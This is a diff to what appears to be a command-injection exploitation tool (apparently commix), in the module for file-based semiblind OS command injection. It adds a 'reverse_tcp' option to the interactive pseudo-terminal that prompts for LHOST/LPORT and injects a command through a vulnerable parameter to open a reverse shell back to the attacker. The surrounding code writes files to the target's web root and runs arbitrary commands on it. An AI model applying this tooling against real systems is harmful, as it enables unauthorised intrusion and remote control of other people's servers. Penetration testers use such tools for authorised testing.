@@ -31,9 +31,10 @@ from src.utils import settings
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 
-from src.core.injections.controller import checks
 from src.core.requests import headers
+from src.core.shells import reverse_tcp
 from src.core.requests import parameters
+from src.core.injections.controller import checks
 
 from src.core.injections.semiblind.techniques.file_based import fb_injector
 from src.core.injections.semiblind.techniques.file_based import fb_payloads
@@ -42,7 +43,7 @@ from src.core.injections.semiblind.techniques.file_based import fb_file_access
 from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler
 
 """
- The "file-based" technique on Semiblind OS Command Injection.
+The "file-based" technique on Semiblind OS Command Injection.
 """
 
 """
@@ -56,6 +57,7 @@ def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_metho
   else :
     sys.stdout.write("\r")
     sys.stdout.flush()
+
 
 """
 Delete previous shells outputs.
@@ -79,7 +81,6 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
   stop_injection = False
   call_tmp_based = False
   export_injection_info = False
-  
   injection_type = "Semiblind Command Injection"
   technique = "file-based injection technique"
 
@@ -112,8 +113,9 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
           settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/html"
         else:
           pass
+
       # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
-      if "nginx" in settings.SERVER_BANNER.lower():
+      elif "nginx" in settings.SERVER_BANNER.lower():
         try:
           check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
           if check_version[0] >= "1.2.4":
@@ -124,6 +126,11 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
             settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + "/www"
         except IndexError:
           pass
+
+      else:
+        settings.SRV_ROOT_DIR = raw_input("(?) Please provide the host's root directory (e.g. /var/www/) > ")
+        settings.CUSTOM_SRV_ROOT_DIR = True
+
       path = urlparse.urlparse(url).path
       path_parts = path.split('/')
       count = 0
@@ -135,7 +142,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
       settings.SRV_ROOT_DIR = settings.SRV_ROOT_DIR + EXTRA_DIR
 
     if not menu.options.verbose:
-      print "(*) Trying to create a file on " + settings.SRV_ROOT_DIR + "... "
+      print "(*) Trying to create a file on '" + settings.SRV_ROOT_DIR + "'... "
     else:
       print "(*) Testing the "+ technique + "... "
 
@@ -179,7 +186,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
 
           # Check if defined "--verbose" option.
           if menu.options.verbose:
-            print "(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + settings.SRV_ROOT_DIR + "..."
+            print "(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' file on '" + settings.SRV_ROOT_DIR + "'..."
             print Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL
 
           # Cookie Injection
@@ -238,7 +245,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 elif i == failed_tries and no_result == True :
                   if not menu.options.verbose:
                     print ""
-                  print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write on "+ settings.SRV_ROOT_DIR + "." + Style.RESET_ALL
+                  print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read and/or write files on '"+ settings.SRV_ROOT_DIR + "'." + Style.RESET_ALL
                   while True:
                     tmp_upload = raw_input("(?) Do you want to try the temporary directory (" + tmp_path + ") [Y/n/q] > ").lower()
                     if tmp_upload in settings.CHOISE_YES:
@@ -409,6 +416,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
           try:
             # Pseudo-Terminal shell
             go_back = False
+            go_back_again = False
             while True:
               # Delete previous shell (text) files (output)
               delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -416,29 +424,48 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 print ""
               if go_back == True:
                 break
-              gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
+              gotshell = raw_input("(?) Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
               if gotshell in settings.CHOISE_YES:
                 print ""
-                print "Pseudo-Terminal (type '?' for shell options)"
+                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                 while True:
-                  cmd = raw_input("Shell > ")
+                  cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                   cmd = checks.escaped_cmd(cmd)
                   if cmd.lower() in settings.SHELL_OPTIONS:
-                    if cmd.lower() == "?":
-                      menu.shell_options()
-                    elif cmd.lower() == "quit":
+                    os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
+                    if os_shell_option == False:
+                      return False
+                    elif os_shell_option == "quit": 
                       # Delete previous shell (text) files (output)
-                      delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                      delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)         
                       sys.exit(0)
-                    elif cmd.lower() == "back":
+                    elif os_shell_option == "back":
                       go_back = True
-                      if checks.next_attack_vector(technique, go_back) == True:
-                        break
-                      else:
-                        if no_result == True:
-                          return False 
-                        else:
-                          return True 
+                      break
+                    elif os_shell_option == "os_shell": 
+                        print Fore.YELLOW + "(^) Warning: You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
+                    elif os_shell_option == "reverse_tcp":
+                      # Set up LHOST / LPORT for The reverse TCP connection.
+                      lhost, lport = reverse_tcp.configure_reverse_tcp()
+                      while True:
+                        if lhost and lport in settings.SHELL_OPTIONS:
+                          result = checks.check_reverse_tcp_options(lhost)
+                        else:  
+                          cmd = reverse_tcp.reverse_tcp_options(lhost, lport)
+                          result = checks.check_reverse_tcp_options(cmd)
+                        if result != None:
+                          if result == 0:
+                            return False
+                          elif result == 1 or result == 2:
+                            go_back_again = True
+                            break
+                        # Command execution results.
+                        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                        # Command execution results.
+                        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+                        if menu.options.verbose:
+                          print ""
+                        print Back.RED + "(x) Error: The reverse TCP connection has been failed!" + Style.RESET_ALL
                     else:
                       pass
                     
@@ -489,6 +516,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
   else :
     sys.stdout.write("\r")
     sys.stdout.flush()
+
 
 """
 The exploitation function.
